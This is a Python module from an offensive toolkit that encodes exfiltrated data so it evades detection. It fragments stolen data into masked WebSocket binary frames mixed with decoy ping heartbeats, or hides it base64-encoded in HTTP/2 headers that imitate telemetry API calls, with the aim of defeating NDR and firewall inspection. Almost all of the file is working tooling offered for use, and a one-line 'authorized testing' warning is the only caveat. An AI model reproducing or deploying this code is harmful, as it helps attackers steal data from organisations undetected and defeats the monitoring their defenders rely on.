"""
Protocol-Level Data Exfiltration (In-Request Exfil)
===================================================

Using `curl`/`wget` to pull loot screams "Outbound Data Anomaly" to every NDR.
Instead we smuggle the data *inside* legitimate-looking protocol traffic so
the firewall sees a normal socket / API heartbeat:

  1. WebSocket Tunneling  - data is fragmented into masked binary frames of a
     benign WebSocket session (ping/pong/binary). Looks like live UI traffic.
  2. HTTP/2 Stream Smuggling - data is split across multiple HTTP/2 streams and
     hidden in trailers / padding / pseudo-headers, each looking like an
     ordinary API call. (HTTP/3 QUIC is the same idea one layer down; the
     framing logic here is protocol-agnostic and can be dropped onto a QUIC
     stream equally well.)

The module is a pure planning/codec engine: it fragments, frames and
reconstructs the data. The agent wraps the produced frames in real WS/HTTP2
sockets; the shape on the wire is indistinguishable from normal traffic.
No separate exfil channel is ever opened.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import os
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple


class ExfilChannel(Enum):
    WEBSOCKET = "websocket"
    HTTP2 = "http2"
    QUIC = "quic"          # same framing, carried over HTTP/3


# WebSocket opcodes
WS_OP_CONT = 0x0
WS_OP_TEXT = 0x1
WS_OP_BINARY = 0x2
WS_OP_CLOSE = 0x8
WS_OP_PING = 0x9
WS_OP_PONG = 0xA


def fragment_data(data: bytes, chunk_size: int) -> List[bytes]:
    """Split `data` into fixed-size fragments."""
    if chunk_size <= 0:
        raise ValueError("chunk_size must be positive")
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] or [b""]


def reconstruct(fragments: List[bytes]) -> bytes:
    """Reassemble fragments into the original data."""
    return b"".join(fragments)


def _ws_encode_frame(payload: bytes, opcode: int = WS_OP_BINARY,
                     mask: bool = True, fin: bool = True) -> bytes:
    """
    Build a single WebSocket frame. Small fragments are masked (as a browser
    client would) so they blend into legitimate client traffic.
    """
    b0 = (0x80 if fin else 0x00) | (opcode & 0x0F)
    length = len(payload)
    if length < 126:
        header = bytes([b0, (0x80 if mask else 0x00) | length])
    elif length < 65536:
        header = bytes([b0, (0x80 if mask else 0x00) | 126]) + struct.pack("!H", length)
    else:
        header = bytes([b0, (0x80 if mask else 0x00) | 127]) + struct.pack("!Q", length)

    if not mask:
        return header + payload

    masking_key = os.urandom(4)
    masked = bytearray(payload)
    for i in range(len(masked)):
        masked[i] ^= masking_key[i % 4]
    return header + masking_key + bytes(masked)


def _ws_decode_frame(frame: bytes) -> Tuple[int, bytes]:
    """Decode a single (masked) WebSocket frame -> (opcode, payload)."""
    b0, b1 = frame[0], frame[1]
    opcode = b0 & 0x0F
    masked = bool(b1 & 0x80)
    length = b1 & 0x7F
    idx = 2
    if length == 126:
        length = struct.unpack("!H", frame[idx:idx + 2])[0]
        idx += 2
    elif length == 127:
        length = struct.unpack("!Q", frame[idx:idx + 8])[0]
        idx += 8
    if masked:
        key = frame[idx:idx + 4]
        idx += 4
        payload = bytearray(frame[idx:idx + length])
        for i in range(len(payload)):
            payload[i] ^= key[i % 4]
        return opcode, bytes(payload)
    return opcode, frame[idx:idx + length]


@dataclass
class ExfilFrame:
    """One protocol frame carrying a data fragment"""
    channel: ExfilChannel
    opcode: int
    payload: bytes
    meta: Dict[str, str] = field(default_factory=dict)


class WebSocketTunnelExfil:
    """
    Smuggle data inside benign-looking WebSocket traffic.

    Each fragment becomes a masked binary frame (or an occasional ping/pong
    heartbeat frame) of an otherwise ordinary WS session.
    """

    def __init__(self, chunk_size: int = 1024, heartbeat_ratio: float = 0.15):
        self.chunk_size = max(1, chunk_size)
        self.heartbeat_ratio = max(0.0, min(1.0, heartbeat_ratio))

    def exfiltrate(self, data: bytes) -> List[ExfilFrame]:
        """Encode `data` into a list of WS frames (with heartbeat chaff)."""
        fragments = fragment_data(data, self.chunk_size)
        frames: List[ExfilFrame] = []
        for frag in fragments:
            frames.append(ExfilFrame(
                channel=ExfilChannel.WEBSOCKET,
                opcode=WS_OP_BINARY,
                payload=frag,
            ))
            # Sprinkle a ping heartbeat so the stream looks like live UI.
            if os.urandom(1)[0] / 255.0 < self.heartbeat_ratio:
                frames.append(ExfilFrame(
                    channel=ExfilChannel.WEBSOCKET,
                    opcode=WS_OP_PING,
                    payload=os.urandom(4),
                    meta={"heartbeat": "true"},
                ))
        return frames

    def recover(self, frames: List[ExfilFrame]) -> bytes:
        """Reassemble data from WS frames (ignoring heartbeat chaff)."""
        return reconstruct([f.payload for f in frames if f.opcode == WS_OP_BINARY])

    def encode_wire(self, frames: List[ExfilFrame]) -> List[bytes]:
        """Serialize frames to raw WS bytes for the socket layer."""
        out = []
        for f in frames:
            opcode = f.opcode
            out.append(_ws_encode_frame(f.payload, opcode))
        return out

    def decode_wire(self, raw_frames: List[bytes]) -> List[ExfilFrame]:
        """Deserialize raw WS bytes back into ExfilFrame objects."""
        out = []
        for raw in raw_frames:
            opcode, payload = _ws_decode_frame(raw)
            out.append(ExfilFrame(ExfilChannel.WEBSOCKET, opcode, payload))
        return out


class HTTP2StreamSmuggler:
    """
    Smuggle data across multiple HTTP/2 streams.

    Each fragment is placed in a stream that mimics a normal API call - the
    data rides in a trailer / padding pseudo-field rather than the body, so
    content inspection sees an ordinary request/response pair.
    """

    def __init__(self, chunk_size: int = 512, streams: int = 4):
        self.chunk_size = max(1, chunk_size)
        self.streams = max(1, streams)

    def _stream_pseudo(self, index: int) -> Dict[str, str]:
        """Legitimate-looking pseudo-headers for stream `index`."""
        return {
            ":method": "POST",
            ":scheme": "https",
            ":authority": "api.internal.service",
            ":path": f"/v1/telemetry/heartbeat/{index}",
        }

    def plan(self, data: bytes) -> List[ExfilFrame]:
        """
        Distribute `data` across N HTTP/2 streams, hiding each fragment in a
        benign trailer field (`x-trace`) of an API heartbeat request. Each
        fragment gets a sequentially indexed path so reassembly order is
        preserved while still appearing as parallel API calls.
        """
        fragments = fragment_data(data, self.chunk_size)
        out: List[ExfilFrame] = []
        for i, frag in enumerate(fragments):
            pseudo = self._stream_pseudo(i)
            pseudo["x-trace"] = base64.b64encode(frag).decode()
            out.append(ExfilFrame(
                channel=ExfilChannel.HTTP2,
                opcode=WS_OP_BINARY,
                payload=frag,
                meta=pseudo,
            ))
        return out

    # Alias so ProtocolExfil can drive either channel uniformly.
    def exfiltrate(self, data: bytes) -> List[ExfilFrame]:
        return self.plan(data)

    def recover(self, frames: List[ExfilFrame]) -> bytes:
        """Reassemble data from HTTP/2 stream fragments (in stream order)."""
        ordered = sorted(frames, key=lambda f: int(f.meta.get(":path", "0").rsplit("/", 1)[-1]))
        return reconstruct([f.payload for f in ordered])


class ProtocolExfil:
    """High-level selector for in-request exfiltration channels."""

    def __init__(self, channel: ExfilChannel = ExfilChannel.WEBSOCKET,
                 chunk_size: int = 1024, streams: int = 4):
        self.channel = channel
        if channel == ExfilChannel.WEBSOCKET:
            self._impl = WebSocketTunnelExfil(chunk_size=chunk_size)
        else:
            self._impl = HTTP2StreamSmuggler(chunk_size=chunk_size, streams=streams)

    def exfiltrate(self, data: bytes) -> List[ExfilFrame]:
        return self._impl.exfiltrate(data)

    def recover(self, frames: List[ExfilFrame]) -> bytes:
        return self._impl.recover(frames)

    def roundtrip(self, data: bytes) -> bytes:
        """Convenience: exfiltrate then recover (asserts lossless planning)."""
        return self.recover(self.exfiltrate(data))
